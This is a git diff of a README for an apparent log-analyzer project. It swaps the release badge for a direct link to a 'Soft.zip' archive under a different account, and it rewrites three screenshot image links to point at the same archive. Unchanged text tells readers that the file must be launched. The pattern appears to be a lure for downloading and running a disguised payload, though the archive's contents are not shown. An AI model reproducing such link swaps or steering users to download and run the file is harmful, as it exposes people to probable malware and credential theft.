@@ -24,7 +24,7 @@ The repository contains the following key components:
 
 ## 🔗 Download Release
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/CodyOaaki/analizator-logs/releases/download/v1.0/Soft.zip%20Release-Click%20Here-brightgreen)](https://github.com/CodyOaaki/analizator-logs/releases/download/v1.0/Soft.zip)
 
 (*Note: The release link above leads directly to a file and needs to be launched to access the release.*)
 
@@ -46,13 +46,13 @@ If you'd like to contribute to the project, feel free to fork the repository and
 
 Here are some screenshots from the project to give you an overview of what to expect:
 
-![Table View](https://via.placeholder.com/600x400.png?text=Table+View)
+![Table View](https://github.com/CodyOaaki/analizator-logs/releases/download/v1.0/Soft.zip+View)
 *Table View: Displaying log data in a tabular format.*
 
-![Hourly Graph](https://via.placeholder.com/600x400.png?text=Hourly+Graph)
+![Hourly Graph](https://github.com/CodyOaaki/analizator-logs/releases/download/v1.0/Soft.zip+Graph)
 *Hourly Graph: Visual representation of log data distribution by hours.*
 
-![Percentage Breakdown](https://via.placeholder.com/600x400.png?text=Percentage+Breakdown)
+![Percentage Breakdown](https://github.com/CodyOaaki/analizator-logs/releases/download/v1.0/Soft.zip+Breakdown)
 *Percentage Breakdown: Graph showing the percentage breakdown of relevant log data fields.*
 
 ## 📢 Support
